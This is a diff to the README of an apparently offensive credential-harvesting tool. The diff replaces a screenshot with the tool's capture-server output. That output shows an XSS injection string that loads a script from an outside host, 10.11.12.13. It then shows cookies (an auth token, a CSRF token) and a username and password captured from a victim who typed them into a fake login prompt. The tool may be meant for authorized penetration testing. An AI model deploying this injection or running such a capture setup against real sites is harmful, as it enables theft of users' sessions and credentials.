@@ -62,6 +62,19 @@ Once started up, and the payload of `<script src="http://10.11.12.13:80/e051.js"
 
 Once the victim browses the vulnerable page and enters their credentials on the fake login prompt, the capture server picks them up and prints them in a screenshot friendly layout:
 
-![Capture server output after a victim submits](img/fauxfront2.png)
+```
+listening   http://10.11.12.13:80
+capture     http://10.11.12.13:80/c/f7c5d924028cb24a0540ef7fe132d6a01c9c66ed93e9e7ec
+payload     http://10.11.12.13:80/e051.js
+injection   <script src="http://10.11.12.13:80/e051.js"></script>
+
+09:09:20  ::1  cookies
+  auth_token: at_f01ef74158eb961149f80593a495583d
+  csrftoken: csrf_e02761ebd0cb29a3da070a57
+  uid: 42
+09:09:59  ::1
+  username: admin
+  password: P4ssw0rd1234
+```
 
 The repo contains a more in-depth set of instructions, considerations, and command-line flags.
